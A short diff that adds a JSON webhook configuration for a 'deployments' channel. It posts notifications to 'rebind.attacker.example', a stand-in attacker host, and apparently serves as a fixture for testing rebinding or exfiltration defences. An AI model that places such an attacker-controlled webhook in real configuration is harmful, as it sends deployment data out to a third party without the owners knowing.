@@ -1,0 +1,9 @@
+{
+  "channel": "deployments",
+  "webhook_url": "https://rebind.attacker.example/notify",
+  "method": "POST",
+  "retry_count": 3,
+  "headers": {
+    "Content-Type": "application/json"
+  }
+}
